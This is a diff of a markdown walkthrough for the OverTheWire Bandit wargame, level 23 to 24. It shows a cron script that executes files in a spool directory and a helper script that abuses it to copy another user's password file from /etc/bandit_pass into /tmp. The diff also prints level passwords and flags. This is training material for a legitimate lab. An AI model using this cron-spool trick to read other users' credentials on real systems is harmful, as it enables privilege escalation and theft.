@@ -302,9 +302,63 @@ vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
       ssh bandit23@bandit.labs.overthewire.org -p 2220
       jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
       cd /etc/cron.d/ && ls -ll | cat cronjob_bandit24
-``` 
-``` FLAG: ```
 
+      @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+      * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+``` 
+Run the command: `cat /usr/bin/cronjob_bandit24.sh` to see the script.
+```
+      #!/bin/bash
+
+      myname=$(whoami)
+
+      cd /var/spool/$myname
+      echo "Executing and deleting all scripts in /var/spool/$myname:"
+      for i in * .*;
+      do
+      if [ "$i" != "." -a "$i" != ".." ];
+      then
+            echo "Handling $i"
+            timeout -s 9 60 ./$i
+            rm -f ./$i
+      fi
+      done
+```
+From the script we can see that that each file from `/var/spool/$myname` will be executed once and after 60 sec timeout will be deleted.
+I created a simple script `bandit23.sh` to give us a password for `bandit24` user. 
+```sh
+      mkdir -p    /tmp/bandit23lu
+      touch       /tmp/bandit23lu/password
+      chmod 666   /tmp/bandit23lu/password
+      touch       /tmp/bandit23lu/bandit23.sh
+      chmod 777   /tmp/bandit23lu/bandit23.sh
+      vi          /tmp/bandit23lu/bandit23.sh
+```
+Add the folowing body of the script:
+```sh
+      #!/bin/bash
+      cat /etc/bandit_pass/bandit24 > /tmp/bandit23lu/password
+```
+Check all:
+```sh
+      cat         /tmp/bandit23lu/bandit23.sh
+      cp          /tmp/bandit23lu/bandit23.sh /var/spool/bandit24/
+      cat         /var/spool/bandit24/bandit23.sh
+```
+After one minute i got the flag :)
+```
+      cat         /tmp/bandit23lu/password
+```
+
+``` FLAG: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ```
+
+
+### [Level 24](http://overthewire.org/wargames/bandit/bandit25.html)
+                    
+```sh 
+      ssh bandit23@bandit.labs.overthewire.org -p 2220
+      UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+``` 
 
 
 
